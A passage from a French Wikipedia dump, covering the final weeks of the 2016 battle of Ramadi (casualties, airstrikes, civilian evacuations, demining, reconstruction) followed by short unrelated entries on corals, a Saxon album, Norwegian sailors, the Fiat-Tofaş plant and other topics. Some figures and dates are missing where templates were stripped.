Le Programme des Nations unies pour le développement (Pnud), en utilisant des images satellites, annonce que 4500 édifices ont été endommagés à Ramadi, dont 1500 ont été complètement détruits. Selon Lise Grand, du Pnud, l'ampleur des destructions dépasse celles des autres villes qui ont souffert des affrontements entre Daech et une autre faction, y compris celle de Tikrit. 60 % de la ville, dont l'artère principale, ont été détruits. Le général de brigade Muhammad Rasheed Salah, originaire d'un village proche de Ramadi, avertit que si l'aide humanitaire n'arrive pas rapidement après la fin de la bataille, il y a de fortes chances que des violences tribales éclatent.
Le 18 janvier, les forces de Daech lancent 5 contre-attaques : 3 dans Ramadi, et 2 aux alentours. À l'intérieur, les zones attaquées sont Al-Graishi, Albi Ziab et Albu Sodah toutes situées au nord de la ville. À Al-Graishi et Albu Ziad, les attaques sont repoussées par le Premier et le Troisième Régiments et l'infanterie de la Dixième Brigade, ce qui provoque la mort de 10 terroristes selon l'Armée. À Albu Sodah, des éléments du Premier Régiment de la Soixante-Treizième Brigade d'Infanterie repoussent l'offensive en tuant 3 attaquants. À l'extérieur, les villages d'Husaibah et d'Al-Maliq sont pris d'assaut. Mais ils sont repoussés par les Forces d'Intervention Rapide de la police, couvertes par l'aviation de la Coalition Internationale, qui auraient tué 25 djihadistes.
Stephan Kalin, journaliste de Reuters, est témoin de la destruction d'un véhicule de l'EI par une frappe aérienne, et rapporte également que 8 djihadistes auraient été tués dans une autre frappe.
Le United States Marine Corps publie sur son site internet une note annonçant qu'ils vont dépêcher des instructeurs au camp militaire d'Al-Taqaddum, afin de former la Huitième Brigade de l'Armée irakienne au maniement de l'artillerie - notamment de l'obusier M198 - afin d'augmenter son efficacité et sa polyvalence à Ramadi.
Des nouveaux civils sont délivrés dans la zone d'Al-Sofiya, dont une famille qui était restée cachée onze jours dans un bâtiment en attendant de voir des soldats irakiens. L'Armée irakienne estime désormais à 3800 le nombre de civils qui ont pu être évacués hors de Ramadi depuis le début de la bataille. Face à cela, la réaction de l'état-major irakien est divisée. Le Colonel Arkan explique que cela peut-être vu à la fois comme un mal et un bien. Un mal, car c'est une source de problèmes logistiques, puisqu'il n'était absolument pas prévu de se retrouver face à des civils aussi nombreux lors de la bataille. Un bien, car cela permet de s'entraîner face à cette situation, qui risque de se reproduire si l'Armée assiège des cités bien plus peuplées et qui conservent encore une importante population civile, comme Mossoul ou Falloujah.
Le 19 janvier, les Forces d'Intervention Rapide irakiennes détruisent 4 véhicules-piégés qui traversaient les abords du village d'Husaybah. De plus, l'artillerie du Bataillon Karar aurait bombardé et détruits quelques positions de l'EI à Al-Madiq, ce qui aurait permis aux Forces d'Intervention Rapide de prendre quelques bâtiments et de les déminer.
Le 20 janvier, des bombardements de la Coalition Internationale et de l'aviation irakienne au nord de Ramadi auraient tués 34 membres de l'EI, détruit 4 de ses postes-de-commandement et 3 de ses véhicules.
Le Conseil de la Province d'Anbar annonce que les pertes humaines et matérielles que l'EI a subi à Husaybah et Juwaiba, entre-autres, dégagent des opportunités d'attaque sur d'autres fronts à l'est de Ramadi, notamment celui de l'Île Khalidyia.
Le 21 janvier, la police fédérale parvient à évacuer 27 familles de civils hors de l'ouest de Ramadi et du village d'Al-Saferiyah, au nord-ouest de Ramadi. Ils seront transférés au district d'Al-Wafaa.
La police fédérale mène un raid aux alentours d'Husaybah, qui se serait soldé par la mort de 13 djihadistes, et la destruction de matériel d'artillerie.
Aux alentours d'Hasiba al Sharqyia, à à l'ouest de Ramadi, des affrontements entre les forces de sécurité et des membres de l'EI causent 3 morts chez ces-derniers, et la destruction de leur matériel.
Dans Ramadi même, les bombardements de la Coalition Internationale sur les zones d'Albu Aiza et d'Al Grishi, au nord de la ville, tuent 18 djihadistes. 5 agents des forces de sécurité irakiennes meurent à cause de l'explosion d'une bombe, dans la zone d'Al-Sofiya, à l'est. Et un bombardement mal placé de la part de l'artillerie irakienne tue 3 civils dans la zone d'Albu Shabaan, au nord.
Le 22 janvier, les policiers découvrent un tunnel creusé par l’État Islamique, qui reliait Al-Madiq à Husaybah. Il aurait également servi de cache d'explosifs et de charnier. Le tunnel a été détruit. Le Major-Général Ismail al-Mahalawi annonce que la Huitième Brigade a progressé aux alentours de plusieurs villages à l'est de Ramadi : Joabah, Sajariyah et Husaiybah. Il explique que ces avancées ont été rendues possibles par le soutien de l'aviation de la Coalition Internationale et l'artillerie irakienne, et par le fait qu'exceptionnellement il n'y a pas eu de civils utilisés comme boucliers-humains.
L'aviation américaine mène 6 frappes à Ramadi, qui auraient détruit des véhicules de l’État Islamique et des caches d'armes et d'explosifs.
Le 23 janvier, Daech revendique trois attentats dont un double-attentat-suicide qui aurait tué 72 soldats irakiens, selon l'organisation terroriste. De son côté, la Coalition Internationale assure avoir tué au moins 53 terroristes dans des bombardements au nord de la Ramadi. Une source sécuritaire anonyme reconnaît que le troisième attentat suicide, qui aurait mené avec un Hummer piégé à l'encontre d'un poste de policiers qui gardaient l'autoroute à l'ouest de Ramadi ; cette source déclare que l'explosion a blessé 7 policiers et a sérieusement endommagé le bâtiment visé.
L'Armée annonce avoir réussi à évacuer 34 civils retenus par l’État Islamique dans un village au nord de Ramadi, et déclare qu'ils seront transférés à Al-Wafaa.
Le 24 janvier, la Coalition Internationale bombarde 6 fois les environs de Ramadi, en visant 3 unités tactiques et 1 bâtiment de l'EI. Le bilan humain est inconnu. Le bilan matériel pour Daech est la perte d'un véhicule et d'un réservoir de carburant.
Au sud-ouest de Ramadi, la police repousse un assaut de Daech. Elle aurait tué et blessé en tout 17 djihadistes et détruit un véhicule piégé.
Les parties de Ramadi contrôlées par le gouvernement irakien sont sécurisées par les policiers fédéraux. Le Premier ministre irakien, Haïder al-Abadi, demande au Ministre de la Défense américain, Ashton Carter (tous les deux étant présent au Forum de Davos en Suisse) l'envoi de formateurs, afin d'entraîner la police locale sunnite pour qu'elle puisse relayer la police fédérale et maintenir Ramadi plus sûre.
La police fédérale attaque 4 sites défensifs de l’État Islamique construits aux environs du village d'Husaybah. Ce qui aurait détruit les 4 sites, tués 11 djihadistes et blessé 6 autres.
Le chef de la police de la province d'Anbar, le Major-Général Hadi Rezeig, annonce que 190 personnes ont été arrêtées, suspectées d'avoir aidé l'EI à viser les policiers de Ramadi.
Le 25 janvier, la brigade spécialisée dans le maniement des lance-roquettes des Forces d'Intervention rapide bombarde 2 positions de l'EI proches d'Husaybah. Ceci aurait tué 8 membres de l'organisation terroriste.
Les combats se poursuivent dans et autour des villages à l'est de Ramadi, spécialement ceux de Sijariya, Juwaiba et Husaybah.
La police de la province d'Anbar aurait repris le contrôle de la zone d'al-Jumaiya, au centre de la ville. Elle y auraient découvert une fosse commune contenant les corps d'une quarantaine de civils, dont des femmes et des enfants, et de représentants des forces de l'ordre, qui porteraient des impacts de balles. Ils auraient été exécutés par les bourreaux du califat après que ce dernier ait pris le contrôle de la ville. Il est possible qu'il s'agisse de Chiites massacrés par les terroristes sunnites extrémistes à cause de leurs croyances religieuses.
Le 26 janvier, à Al-Sofiya, l'Armée parvient à encercler et incendier un poste de commandement de l'EI, qui aurait également servi d'entrepôt d'armes. Les combats auraient tué 6 djihadistes. Et selon le Major-Général Ismail Mahlawi, cela devrait perturber l'approvisionnement des troupes de Daech situées à l'est de Ramadi.
Le 27 janvier, la Coalition Internationale frappe 5 cibles dans Ramadi : une position de snipers, deux positions de combats, un camion-citerne et une zone contestée.
Au nord de la ville, une voiture piégée explose sur le centre de commandement de la Dixième Brigade, tuant 30 soldats et miliciens.
À Al-Sofyia, à l'est de Ramadi, l'Armée aurait détruit un véhicule piégé avant qu'il n'atteigne ses lignes.
Les Forces d'intervention rapide auraient attaqué de nombreuses positions de l'EI dans et autour des villages d'Husaybah et d'Al-Sharqiya à l'est de Ramadi. Cela aurait détruit 7 positions, nettoyé plusieurs bâtiments et tué 35 djihadistes.
Des bombardements de l'aviation irakienne détruisent quatre véhicules piégés à Albu Hays, au nord de Ramadi.
Le 28 janvier, le général Abdelghani al-Assadi déclare que 95 % de la ville est contrôlée par l'armée irakienne. Les deux dernières zones encore non contrôlées seraient al-Sijariya et Husaibah.
La Dixième Brigade de l'Armée aurait totalement repris le contrôle du nord de Ramadi, après avoir annihilé la dernière charge des terroristes qui y subsistaient. La charge était dirigée contre le poste de commandement de la brigade. L'Armée donne le bilan suivant : 60 assaillants tués, dont les conducteurs de 19 véhicules piégés, grâce à l'aviation et à l'artillerie irakiennes.
À l'ouest de Ramadi, une frappe française vise et détruit un "centre de stockage d'armements et de production d'armements".
Le Major-Général Ismail al-Mahalawi annonce que la Huitième Brigade, couverte par l'aviation de la Coalition Internationale, aurait progressé dans la zone d'Al-Sijariya. En tout, la Coalition Internationale aurait lancé 15 frappes.
Tirant les leçons de cette bataille, et celles de Tikrit, Sinjar et de Baiji, l'Armée irakienne applique une nouvelle méthode, enseignée par des instructeurs américains, portugais et espagnols, pour progresser dans les zones minées. Le terrain miné est dégagé par des tirs de mortiers, puis des bulldozers et des engins de déminages passent pour ouvrir des brèches, dans lesquels les soldats s'engouffrent à bord de véhicules blindés. Par la suite, les pièges qui n'ont pas encore explosé sont désamorcés grâce au système américain Apobs (Anti-personnel Obstacle Breaching System). Cette méthode est appelée à se généraliser pour la suite de la guerre contre l’État Islamique.
La police fédérale aurait tué 24 djihadistes lors des combats à Husaybah. De plus, elle aurait détruit à l'aide de roquettes un abri de l'EI à l'est de Ramadi, ce qui aurait tué 4 autres de ses membres, et un camion d'approvisionnement qui venait vers Husaybah.
Le 29 janvier, des bombardements de la Coalition Internationale auraient détruit 2 abris de Daech situé au nord de la ville.
Le total de nombre de frappes aériennes sur la ville entre le 23 et le 29 janvier est de 58 bombardements. De plus, sur les 99 attentats-suicides commis par Daech en Irak et en Syrie entre le 1 et le 29 janvier, un tiers l'ont été à Ramadi ou à Haditha.
Le 30 janvier, l'Armée irakienne, soutenue par l'aviation irakienne et celle de la Coalition Internationale, serait parvenue à reprendre du terrain au sud et à l'ouest de la zone d'al-Sajariyah.
Le 31 janvier, la Police fédérale aurait attaqué et détruit 6 positions défensives de l’État Islamique à l'est d'Husaybah, et aurait tué 9 combattants islamistes, dont 1 sniper. Par la suite, la police a déminé plusieurs engins explosifs.
7 bombardements de la Coalition Internationale visent 3 unités de l'EI à Ramadi. Le bilan des frappes est inconnu.
Le 2 février, Khairuldeen Al Makhzoomi, spécialiste du Proche-Orient à l'Université de Californie, publie un article sur le site de The Huffington Post où il estime que le gouvernement irakien contrôle en réalité 75 % à 80 % de Ramadi.
Le 3 février, Daech lance une contre-attaque contre la Huitième Division, au nord et à l'est de Ramadi. Dans la banlieue est, à Shujirayah, au moins 9 soldats irakiens sont tués.
6 frappes de la Coalition Internationale sur Ramadi détruisent de l'équipement, des armes et des positions de combat de l'État Islamique.
Les Forces d'Intervention Rapide attaquent et détruisent à Husaybah 2 abris de l'EI, ce qui aurait tué 11 djihadistes. De plus, une partie de ses agents - regroupés dans un groupe appelé "Scorpion Force" - aurait pris en chasse et détruit un camion rempli d'explosifs, tuant ainsi 2 autres terroristes.
Dans le village d'Abu Risha, au nord de Ramadi, des tirs d'artillerie de l'État Islamique tuent 4 militaires irakiens et en blessent 2 autres.
Du 4 au 9 février 2016 : liquidation des dernières poches de résistance djihadistes.
Le 4 février, un bombardement de l'aviation irakienne aurait détruit 4 postes de commandement de l'État islamique à Albu Assaf, dans Ramadi.
Dans une bibliothèque, les démineurs neutralisent plus de engins explosifs. Notamment des jerrycans remplis d'explosifs.
L'aviation américaine lance quatre frappes aux alentours de Ramadi.
La troisième brigade antiterroriste parvient à prendre le contrôle du centre de la zone d'Al-Sijariya. Les combats auraient fait 17 morts dans les rangs de Daech. À la fin de la journée, le Conseil de la Province d'Anbar annonce qu'Al-Sijariya a été entièrement libérée.
Daech continue de tenir une palmeraie située à trois kilomètres des faubourgs de Ramadi. Un nombre inconnu de djihadistes, Arabes et Européens, s'y cachent dans les fourrés et se sont barricadés dans une maison. Ils se protègent en gardant des civils en otage. Selon l'armée irakienne, il s'agirait des derniers terroristes présents dans Ramadi même. Le 5 février, l'aviation mène un bombardement ; puis une unité anti-terroriste surnommée "le Commando en Or" lance l'assaut. En riposte les combattants islamistes lancent un bombardement d'obus contre les chars et l'artillerie irakienne. Finalement, l'Armée parvient à reprendre la palmeraie, et tue un nombre indéterminé de terroristes. Avant de fuir, les membres de l'EI piègent les cadavres, ce qui n'empêche pas l'Armée de prendre le contrôle du terrain.
Le 6 février, trois véhicules piégés sont repérés en train de se diriger vers les postes de commandement de l'armée irakienne à Al-Thurthar, au nord de Ramadi. Deux des véhicules sont détruits par l'armée et le troisième par une frappe de la coalition internationale, avant qu'ils n'atteignent leurs cibles. Par la suite les combats provoquent la mort de 7 militaires et 4 terroristes.
Dans la zone d'Al-Sufyia, six soldats irakiens sont tués et cinq autres sont blessés par l'explosion d'une mine.
Des frappes de la coalition internationales détruisent deux voitures piégées à Husaiybah al-Sharqiyah.
Le major-général Sami al-Aredi, commandant de la troisième brigade d'opérations spéciales antiterroriste, annonce que la route reliant entre elles Sijariya et Tel Mushaihida, dans l'est de Ramadi, et Juwiba, à l'est de Ramadi, est entièrement libérée. Il annonce également 64 civils ont été libérés et évacués de Juwiba.
Une contre-attaque de l’État islamique qui se dirigeait vers le nord de Ramadi aurait été interceptée et repoussée par des miliciens tribaux, aux termes de combats qui auraient fait plusieurs dizaines de morts.
Le 7 février, une autre contre-attaque parvient jusqu'au nord de Ramadi. Des combats éclatent entre, d'une part la dixième brigade de l'armée et les miliciens d'al-Hashd al-Shaabi, de l'autre les troupes de Daech. Le bilan des pertes n'a été communiqué que pour ces derniers : 44 morts dont les conducteurs de 7 véhicules piégés.
Lors des combats pour reprendre Juwiba, plusieurs civils essayent de fuir la zone de contrôle de l’État islamique pour rejoindre les rangs de l'armée. Les djihadistes les auraient exécutés.
Le ministère de la Défense irakien déclare que la zone d'Al-Sijariya, à à l'est de Ramadi, est totalement libérée. Les forces anti-terroristes y ont déminé plusieurs dizaines de pièges explosifs, et y ont hissé le drapeau irakien.
Le 8 février, le major-général Ismail al-Mahalawi annonce que la zone de Juwiba est totalement libérée, que les otages qui s'y trouvaient ont été délivrés, et que le drapeau irakien y flotte. Selon l'agence de presse IANS, les combats ont provoqué 25 morts et la destruction de 6 véhicules dans les rangs de Daech, 8 morts et 5 blessés dans l'Armée.
Deux frappes aériennes américaines sont menées sur Ramadi. Elles auraient détruit trois véhicules de l'EI dont un était piégé, et une batterie antiaérienne.
De violents combats entre Daech, les forces antiterroristes et les milices tribales ont lieu à Husaiybah al-Sharqiyah. 43 djihadistes sont morts, dont 5 kamikazes, et 7 ont été capturés ; 4 membres des forces gouvernementales ont été tués, et 12 blessés.
Le 9 février, les forces gouvernementales parviennent à libérer la zone de Joabh et à progresser dans celle d'Husaiybah al-Sharqiyah, face à une faible résistance de l’État Islamique.
En fin de journée, le ministre de la Défense irakien annonce que les forces antiterroristes, les huitième et neuvième brigades de l'armée, les milices paramilitaires sunnites al-Hashed al-Shaabi et la police de la province d'Anbar ont fini de reprendre tous les grands axes de Ramadi. Et plus précisément les libérations d'al-Sijaria, Juwaiba, Husaybah al-Sharkiya, des zones adjacentes et de la route Ramadi-Khalidiya-Bagdad. Dans la foulée, des engins explosifs et des véhicules piégés abandonnés sur cette route sont déminés. Le nettoyage de cette route permet également de relier Ramadi à la grande base militaire d'Habbaniya, et ainsi de mieux sécuriser le secteur est de la ville.
Au nord-ouest de Ramadi, à Albu-Thyiab une frappe aérienne menée par un Soukhoï irakien aurait détruit un convoi de véhicules de l'EI, composés d'automitrailleuses équipés de canons , de véhicules armés de mortiers , et de véhicules piégés. Le bilan humain serait la mort de 10 djihadistes.
La ville de Ramadi est à nouveau déclarée libérée par le ministre de la Défense, Khaled Al-Obeidi, par le gouverneur de la province d'Al-Anbar, Sohaib al-Rawi, et par le porte-parole de la coalition internationale, le colonel Steven Warren, le 9 février 2016.
Bilan de la bataille.
Le 9 février 2016, le gouverneur de la province d'Al-Anbar, Sohaib al-Rawi, lors d'une conférence de presse à Bagdad, annonce : "Tout Ramadi est maintenant libéré mais le plus grand défi qui nous attend consiste à nettoyer la ville des mines". Il reste en effet plusieurs milliers d'engins explosifs disséminés dans la ville et aux alentours, au lendemain de la bataille.
Plusieurs milliers de civils ont été déplacés hors de leurs maisons, et la ville est souvent qualifiée de "ville fantôme" par les médias francophones. Ou ils ont été envoyés dans les camps de réfugiés irakiens par l'Armée, ou l'EI les a forcés à les suivre afin de se servir d'eux comme boucliers humains.
Le bilan matériel est catastrophique. Jusque-là, aucune autre ville au cours de la Seconde guerre civile irakienne n'avait subi un bilan aussi lourd. Le 17 janvier 2016, le Programme des Nations unies pour le développement (Pnud), en utilisant des images satellites, annonce que 4500 édifices ont été endommagés à Ramadi, dont 1500 ont été complètement détruits. Un nouveau rapport publié en février chiffre à le nombre d'immeubles partiellement détruits et à ceux entièrement détruits. Selon Lise Grand, du Pnud, l'ampleur des destructions dépasse celles des autres villes qui ont souffert des affrontements entre Daech et une autre faction, y compris celle de Tikrit. 60 % de la ville, dont l'artère principale, ont été détruits. Le 10 février, Lise grand déclarait : "Les maisons sont détruites, les ponts sont détruits, les rues sont pleines d'engins explosifs, les conduites d'eau, les écoles et les hôpitaux sont en ruine et les commerces sont fermés". Les djihadistes de l’État Islamique ont partiellement détruit l'hôpital général de Ramadi le 6 janvier.
Un plan de reconstruction en deux phases est décidé par l'ONU. D'abord () seront utilisés pour reconstruire Ta'Mim, le quartier au sud-ouest de Ramadi où a commencé la bataille ; les conduites d'eau et les générateurs d'électricité devraient être reconstruits en priorité. La deuxième phase, évaluée entre et ( et ) se concentrera sur le centre de Ramadi, notamment pour rebâtir plusieurs milliers de maisons.
Du côté tactique, tirant les leçons de cette bataille, et celles de Tikrit, Sinjar et de Baiji, l'Armée irakienne applique une nouvelle méthode, enseignée par des instructeurs américains, portugais et espagnols, pour progresser dans les zones minées. Le terrain miné est dégagé par des tirs de mortiers, puis des bulldozers et des engins de déminage passent pour ouvrir des brèches, dans lesquels les soldats s'engouffrent à bord de véhicules blindés. Par la suite, les pièges qui n'ont pas encore explosé sont désamorcés grâce au système américain Apobs (Anti-personnel Obstacle Breaching System). Cette méthode est appelée à se généraliser pour la suite de la guerre contre l’État Islamique.
Du côté stratégique, la reprise et la sécurisation de Ramadi permettent de progresser en direction des villes de Faloudjah et Mossoul. Des unités militaires irakiennes, paramilitaires sunnites et chiites, ayant déjà commencé à être déplacées en vue de ces futures batailles, avant même la fin de la bataille de Ramadi.
Suites.
Selon Ibrahim al-Osseij, sous-préfet de Ramadi depuis février, 20 % des maisons et 80 % des infrastructures et des bâtiments publics ont été détruits après deux années de combats. Selon l'ONU, immeubles ont été endommagés, dont détruits. Après la bataille, le déminage de la ville se poursuit pendant des mois, celui des zones d'habitations s'achève en juillet tandis que celui des infrastructures débute en mai. Des sociétés britanniques et américaines sont chargées des infrastructures, mais le déminage des habitations a été effectué par des volontaires locaux. Selon al-Osseij, 150 d'entre-eux ont été tués à cause d'un manque d'entraînement. Les djihadistes avaient laissés des pièges jusque dans les frigos et sur des Corans.
De février à septembre 2016, des regagnent Ramadi et policiers sont déployés dans la ville, contre avant la guerre. Les autorités locales ont également obtenu le retrait des Hachd al-Chaabi.
En août 2017, un charnier est découvert à Ramadi, contenant les corps de 40 personnes exécutés par les djihadistes lors de la prise de la ville en 2015.
Rumeurs d'exécutions de fuyards.
À partir du 25 décembre 2015, plusieurs rumeurs tournent sur Internet à propos de possibles exécutions, par Daech, de certains de ses combattants, qui auraient fui Ramadi au lieu de s'y battre à mort. Si rien ne permet formellement de démentir la plupart des exécutions, rien ne permet non plus de les confirmer. En effet, dans la plupart des cas, les articles qui propagent cette information potentiellement erronée proviennent de sources qui ne sont pas neutres, voire qui ont déjà inventé de fausses informations par le passé.

</doc>
<doc id="9623475" url="https://fr.wikipedia.org/wiki?curid=9623475" title="Polymyces montereyensis">
Polymyces montereyensis

Polymyces montereyensis est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9623480" url="https://fr.wikipedia.org/wiki?curid=9623480" title="Solid Ball of Rock">
Solid Ball of Rock

 est le album studio du groupe britannique de heavy metal, Saxon. Il est sorti le sur le label Virgin Records et a été produit par le groupe et Kalle Trapp.
Il est marqué par l'arrivée de Nibbs Carter à la basse pour remplacer Paul Johnson. L'album n'entra pas dans les classements musicaux du Royaume-Uni mais se classa en Allemagne (#23) et en Suisse (#28).

</doc>
<doc id="9623481" url="https://fr.wikipedia.org/wiki?curid=9623481" title="Thomas de Cysoin">
Thomas de Cysoin



</doc>
<doc id="9623483" url="https://fr.wikipedia.org/wiki?curid=9623483" title="Polymyces tannerensis">
Polymyces tannerensis

Polymyces tannerensis est une espèce de coraux de la famille des Flabellidae.
Taxonomie.
Pour plusieurs sources, dont le "World Register of Marine Species", ce taxon est invalide et lui préfèrent "Polymyces montereyensis" .

</doc>
<doc id="9623484" url="https://fr.wikipedia.org/wiki?curid=9623484" title="Usine Fiat-Bursa">
Usine Fiat-Bursa

L’usine Fiat-Tofaş de Bursa est une usine de Fiat Group Automobiles située dans l'ouest de la Turquie pour la production automobile qui a été mise en service en 1970.
Histoire.
L’origine en 1970.
Le constructeur italien Fiat a une longue histoire en Turquie. Sa première implantation remonte à 1966 où il crée une filiale pour la production locale de camions et autobus avec l'appui de Vehbi Koç, la société Otoyol, travaillant sous licence de Fiat V.I.. Comme dans quasiment tous les pays, les taxes et droits de douane sur les produits finis importés étaient très élevés à l'époque. La Turquie ne disposait d'ailleurs pas d'industrie automobile.
Le rêve du président Vehbi Koç, président du groupe du même nom, était de créer un complexe automobile en Turquie. Il réalisera ce rêve en 1968, avec l'aide de la famille Agnelli, patrons de Fiat S.p.A., en créant la "Turkish Automotive Factory Inc." - TOFAŞ.
La production débute le avec le modèle Fiat 124 rebaptisé Tofaş 124 Murat. Cette usine, entièrement nouvelle, conçue par Fiat Engineering sur le modèle des usines Fiat déjà bien connues dans le monde, fut implantée sur un terrain de dont d'ateliers couverts. Depuis, pour répondre à la demande croissante, la surface du terrain s'est accrue à 933.832 m² et les ateliers n'ont cessé de croître pour atteindre . La capacité de production installée est aussi passée de automobiles/an en 1971 à en 2006 et a atteint en 2015.
L’usine Fiat-Tofaş de Bursa est une usine de production complète d'automobiles et de petits véhicules utilitaires. Elle est située sur la commune de Bursa, en Anatolie, en Turquie. Sur , elle occupe environ salariés directs dont 5.711 ouvriers de fabrication. Elle se distingue par un niveau très élevé de qualité qui lui a valu le titre de "Gold Plant Level".
Le , l'usine fêtait sa 2.000.000 voitures produite, en , son 3.000.000 véhicule, en , le 4.000.000 et devrait fêter le 5.000.000 en fin d'année 2015.
La production.
La production de l'usine Fiat-Tofaş de Bursa est passée de 40.000 unités en 1971 à 250.000 en 2006 pour atteindre 400.000 en 2015.
La production actuelle repose sur 5 modèles :
Productions.
L’usine de Bursa a fabriqué et assemblé différents modèles depuis sa création :
De très nombreuses Fiat-Tofaş 131 ont été exportées jusqu'en 2010 en CKD vers l'Égypte pour y être assemblés chez El Nasr. Des Fiat Albea et Doblò ont été exportés en Russie en 2007 et 2008 pour y être assemblés chez Severstal avec qui Fiat avait noué un accord de coopération.

</doc>
<doc id="9623496" url="https://fr.wikipedia.org/wiki?curid=9623496" title="Polymyces wellsi">
Polymyces wellsi

Polymyces wellsi est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9623498" url="https://fr.wikipedia.org/wiki?curid=9623498" title="Annette Carducci">
Annette Carducci

Annette Carducci est une réalisatrice française née en Allemagne en 1942.
Biographie.
Annette Carducci a suivi des études de sciences politiques en Allemagne avant de s'installer à Paris en 1967.
Réalisatrice de deux longs métrages, elle a surtout travaillé dans le secteur de la production en France et aux États-Unis.
Elle a créé en 2009 la société "Mainstreet Productions", qui a cessé son activité en 2015.

</doc>
<doc id="9623499" url="https://fr.wikipedia.org/wiki?curid=9623499" title="USS Bunker Hill (CG-52)">
USS Bunker Hill (CG-52)

L'USS "Bunker Hill" (CG-52) est un croiseur lance-missiles de l'United States Navy.
Conception.
Il s'agit du premier navire à utiliser le Mark 41 Vertical Launching System de façon opérationnelle.
Histoire.
Lancé en 1985, il a participé a une mission de coopération avec les forces navales françaises en 1990 durant la seconde guerre du Golfe.

</doc>
<doc id="9623503" url="https://fr.wikipedia.org/wiki?curid=9623503" title="Sven Rampf">
Sven Rampf

Sven Rampf (né le à Pfronten) est un ancien joueur professionnel allemand de hockey sur glace.
Carrière.
Rampf commence sa carrière au EV Pfronten en Oberliga puis au EV Füssen en 2. Bundesliga. Il découvre l'élite lors de la saison 1992-1993 en tant que gardien remplaçant de l'EV Krefeld.
Lors de la saison 1995-1996, il rompt son contrat de titulaire avec l'EHC Timmendorfer Strand 06 en 2. Bundesliga pour rejoindre l'EC Hannover Indians en DEL comme remplaçant. Puis il signe pour une saison avec les Ayr Scottish Eagles en Ice Hockey Superleague où il est titulaire. Mais il revient en Allemagne en 1997 au sein de l'Adendorfer EC en 2. Bundesliga. La saison suivante, il retrouve l'élite avec les Adler Mannheim et devient champion. Malgré les vingt matchs joués avec Mannheim, il signe en 1999 pour le Augsburger Panther où il est titulaire deux saisons. Après 2001, il quitte l'élite pour jouer une saison en 2. Bundesliga puis entre l'Oberliga et la Bayernliga. Durant la saison 2006-2007, il va le temps des play-off au Augsburger Panther puis au SC Riessersee. Il arrête sa carrière en 2009 avec l'EV Pfronten en quatrième division.

</doc>
<doc id="9623504" url="https://fr.wikipedia.org/wiki?curid=9623504" title="Sigve Lie">
Sigve Lie

Sigve Lie est un skipper norvégien né le à Haugesund et mort le à Oslo.
Biographie.
Sigve Lie participe aux Jeux olympiques d'été de 1948 à Londres, où il remporte avec Håkon Barfod et Thor Thorvaldsen la médaille d'or en classe Dragon. Le trio norvégien conserve son titre aux Jeux olympiques d'été de 1952 à Helsinki.

</doc>
<doc id="9623507" url="https://fr.wikipedia.org/wiki?curid=9623507" title="Hakon Barfod">
Hakon Barfod

Hakon Barfod est un skipper norvégien né le à Oslo et mort le à Bærum.
Biographie.
Hakon Barfod participe aux Jeux olympiques d'été de 1948 à Londres, où il remporte avec Sigve Lie et Thor Thorvaldsen la médaille d'or en classe Dragon. Le trio norvégien conserve son titre aux Jeux olympiques d'été de 1952 à Helsinki.

</doc>
<doc id="9623508" url="https://fr.wikipedia.org/wiki?curid=9623508" title="Håkon Barfod">
Håkon Barfod



</doc>
<doc id="9623510" url="https://fr.wikipedia.org/wiki?curid=9623510" title="Monomyces">
Monomyces

Monomyces est un genre de coraux durs de la famille des Flabellidae.
Liste d'espèces.
Le genre "Monomyces" comprend les espèces suivantes :

</doc>
<doc id="9623517" url="https://fr.wikipedia.org/wiki?curid=9623517" title="Thor Thorvaldsen">
Thor Thorvaldsen

Thor Thorvaldsen est un skipper norvégien né le à Bamble et mort le à Bærum.
Biographie.
Thor Thorvaldsen participe aux Jeux olympiques d'été de 1948 à Londres, où il remporte avec Sigve Lie et Hakon Barfod la médaille d'or en classe Dragon. Le trio norvégien conserve son titre aux Jeux olympiques d'été de 1952 à Helsinki.

</doc>
<doc id="9623521" url="https://fr.wikipedia.org/wiki?curid=9623521" title="Paris pieds nus">
Paris pieds nus

Paris pieds nus est un film franco-belge réalisé par Dominique Abel et Fiona Gordon en 2015 et sorti en 2016.
Il s'agit du dernier film dans lequel a joué l'actrice française Emmanuelle Riva.
Synopsis.
Fiona, bibliothécaire canadienne, reçoit une lettre d'appel au secours de sa tante Martha, âgée de 88 ans, installée à Paris depuis une cinquantaine d'années et à présent harcelée pour être placée en maison de retraite.
Fiona débarque à Paris, sans maîtriser la langue, pour aider sa tante. Elle rencontre fortuitement un gendarme canadien en stage qui l'aide à faire ses premiers pas dans le métro parisien. Malheureusement, Martha est introuvable à son domicile quand Fiona parvient à atteindre ce dernier.
S'ensuivent de folle courses poursuites, à pied, entre les principaux protagonistes.
Par un malheureux concours de circonstances, Fiona tombe dans la Seine où elle perd son sac à dos contenant toutes ses affaires, argent et papiers d'identité compris. Si les formalités administratives sont facilitées par son compatriote qu'elle recroise régulièrement, la recherche de Martha est source de mésaventures.
Dom, sans-abri installé sur l'île aux Cygnes, récupère aussi bien le sac de Fiona, que Martha qui fuit à vue les employés de la maison de retraite et que Fiona elle-même, toujours à la recherche de sa tante. Tombé amoureux de Fiona dès leur première rencontre, Dom tente de l'aider de son mieux, mais elle le fuit et essaye infructueusement de résister à l'intérêt qu'il lui témoigne.
Tournage.
Le tournage a eu lieu à Paris du au .

</doc>
<doc id="9623522" url="https://fr.wikipedia.org/wiki?curid=9623522" title="Friedrich Wilhelm, prince de Hohenlohe-Kirchberg">
Friedrich Wilhelm, prince de Hohenlohe-Kirchberg



</doc>
<doc id="9623528" url="https://fr.wikipedia.org/wiki?curid=9623528" title="Flabellum alabastrum">
Flabellum alabastrum

Flabellum alabastrum est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9623529" url="https://fr.wikipedia.org/wiki?curid=9623529" title="Communauté tibétaine au Canada">
Communauté tibétaine au Canada

Bien que la communauté tibétaine au Canada, les Tibétains-canadiens, ou Canadiens d'origine tibétaine, composent une petite partie des Asiatiques-canadiens, le Canada détient l'une des plus grandes concentrations de Tibétains en dehors de l'Asie. Les Tibétains ont commencé à immigrer au Canada dès le début des années 1970.
Population.
En 2006, la population tibétaine au Canada a été estimé à et a continué de croître atteignant en 2011 et sont estimés à en 2013. En 2016, la population tibétaine au Canada était de .
